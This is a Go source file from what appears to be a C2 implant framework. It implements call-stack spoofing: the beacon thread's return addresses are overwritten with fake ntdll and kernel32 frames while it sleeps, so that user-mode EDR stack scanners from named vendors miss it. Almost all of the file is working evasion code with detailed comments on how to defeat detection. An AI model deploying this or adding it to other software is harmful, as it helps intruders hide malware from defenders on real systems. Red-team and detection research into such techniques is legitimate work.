package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Thread call-stack spoofing.
//
// Modern EDRs (CrowdStrike, Elastic, Defender ATP) walk the call stack of
// every suspicious thread at scan time. A beacon thread sleeping between
// check-ins typically shows a stack like:
//
//   ntdll!NtWaitForSingleObject
//   ntdll!RtlWaitOnAddress
//   <anonymous memory + 0x1234>     ← implant .text — flagged immediately
//   <anonymous memory + 0x5678>
//   kernel32!BaseThreadInitThunk
//   ntdll!RtlUserThreadStart
//
// The "anonymous memory" frames are the tell: legitimate Windows threads
// always have named-module frames all the way back to BaseThreadInitThunk.
//
// Technique — synthetic return-address chain:
//
//   Before the implant thread enters its idle wait (NtWaitForSingleObject /
//   SleepEx), we overwrite the stack frames above the current RSP with a
//   plausible Windows call chain — specifically the thread-pool path that
//   worker threads use:
//
//     ntdll!TppWorkerThread+0x692
//     kernel32!BaseThreadInitThunk+0x14
//     ntdll!RtlUserThreadStart+0x21
//
//   Then we call the wait primitive. When a scanner walks the stack it sees
//   only named-module return addresses and concludes the thread is a normal
//   Windows worker.
//
//   After the wait returns we restore the original frames so the Go runtime
//   can resume correctly.
//
// Implementation notes:
//   - We lock the OS thread (runtime.LockOSThread) so the goroutine stays
//     pinned; this is required before any unsafe stack manipulation.
//   - We write exactly frameCount synthetic frames above RSP. The offsets
//     (+0x692 etc.) are the real offsets observed in WinDBG on Win10/11 —
//     they look plausible to a scanner because they correspond to real code.
//   - Go's goroutine stacks grow and are occasionally moved by the GC. We
//     read RSP via assembly rather than Go pointer arithmetic. The small
//     unsafe.Slice into stack memory is safe because LockOSThread pins the
//     OS stack for the duration.
//   - This does NOT defeat a kernel-level stack walk (e.g. via !thread in
//     WinDBG with full symbols). It defeats user-mode scanners that call
//     RtlCaptureStackBackTrace / StackWalk64 from an injected thread.

import (
	"runtime"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// spoofFrame describes one synthetic return address to place on the stack.
type spoofFrame struct {
	module string // DLL name for logging only
	offset uintptr
}

// syntheticChain is the return-address sequence we inject. Offsets are
// hand-picked from real Windows 10 22H2 / Windows 11 23H2 call stacks
// captured with WinDBG so they map to real instructions inside those DLLs.
var syntheticChain []spoofFrame

func init() {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	k32 := windows.NewLazySystemDLL("kernel32.dll")

	// Best-effort — offsets land inside the real function bodies.
	tppWorker := resolveExportOffset(ntdll, "TppWorkerThread", 0x692)
	baseThread := resolveExportOffset(k32, "BaseThreadInitThunk", 0x14)
	rtlUser := resolveExportOffset(ntdll, "RtlUserThreadStart", 0x21)

	// Build chain from deepest (first popped on ret) to shallowest.
	syntheticChain = []spoofFrame{
		{"ntdll!TppWorkerThread", tppWorker},
		{"kernel32!BaseThreadInitThunk", baseThread},
		{"ntdll!RtlUserThreadStart", rtlUser},
	}
}

// resolveExportOffset resolves a DLL export and adds a byte offset.
// Returns 0 if the export is not found (chain entry is skipped).
func resolveExportOffset(dll *windows.LazyDLL, name string, offset uintptr) uintptr {
	proc := dll.NewProc(name)
	if err := proc.Find(); err != nil {
		return 0
	}
	return proc.Addr() + offset
}

// SpoofedWait performs a duration-long alertable wait with a synthetic
// call-stack visible to user-mode scanners. It combines naturally with
// ObfuscatedSleep: call SpoofedWait *instead of* SleepEx when stack
// scanning is the primary concern; combine with ObfuscatedSleep when both
// memory scanning and stack scanning are threats.
//
// If stack spoofing setup fails for any reason the function falls back to
// a plain SleepEx call — the implant keeps working, just without spoofing.
func SpoofedWait(ms uint32) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	saved, ok := overwriteStackFrames(syntheticChain)
	if !ok {
		// {{if .Config.Debug}}
		log.Printf("[stackspoof] frame overwrite failed, using plain SleepEx")
		// {{end}}
		sleepExDirect(ms)
		return
	}

	sleepExDirect(ms)

	restoreStackFrames(saved)
}

// overwriteStackFrames replaces the return addresses sitting above the
// current stack pointer with the synthetic chain. Returns the saved
// original values and true on success.
func overwriteStackFrames(chain []spoofFrame) ([]uintptr, bool) {
	if len(chain) == 0 {
		return nil, false
	}

	// Capture RSP. We read 8 bytes above each frame slot we intend to write.
	// The "frame slots" are the return addresses that the Go runtime placed
	// when it called into our function.
	//
	// On x64 the call stack above our current frame looks like:
	//   [RSP+0]  = return address back to our caller (Go runtime glue)
	//   [RSP+8]  = caller's caller return address
	//   ...
	// We write starting at [RSP + 8] to leave the immediate return to the
	// Go runtime untouched (it must stay valid for the goroutine to resume).
	rsp := getCurrentRSP()
	if rsp == 0 {
		return nil, false
	}

	const skipFrames = 2 // skip: overwriteStackFrames + SpoofedWait frames
	slotBase := rsp + uintptr(skipFrames*8)

	saved := make([]uintptr, len(chain))
	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(slotBase)), len(chain))

	for i, frame := range chain {
		if frame.offset == 0 {
			return nil, false
		}
		saved[i] = slots[i]
		slots[i] = frame.offset
		// {{if .Config.Debug}}
		log.Printf("[stackspoof] frame[%d] %s: 0x%x → 0x%x",
			i, frame.module, saved[i], frame.offset)
		// {{end}}
	}
	return saved, true
}

// restoreStackFrames puts back the original return addresses after the
// wait completes so the Go runtime can unwind correctly.
func restoreStackFrames(saved []uintptr) {
	rsp := getCurrentRSP()
	if rsp == 0 || len(saved) == 0 {
		return
	}
	const skipFrames = 2
	slotBase := rsp + uintptr(skipFrames*8)
	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(slotBase)), len(saved))
	for i, v := range saved {
		slots[i] = v
	}
}

// getCurrentRSP returns the stack pointer of the calling goroutine's OS
// thread via a tiny assembly stub. Defined in stackspoof_windows_amd64.s
// for x64 and stubbed on other arches.
func getCurrentRSP() uintptr

// sleepExDirect calls SleepEx without going through the Go wrapper so the
// stack above this call is entirely under our control.
var (
	modK32SpSpoofing  = windows.NewLazySystemDLL("kernel32.dll")
	procSleepExSpoof  = modK32SpSpoofing.NewProc("SleepEx")
)

func sleepExDirect(ms uint32) {
	procSleepExSpoof.Call(uintptr(ms), 0)
}
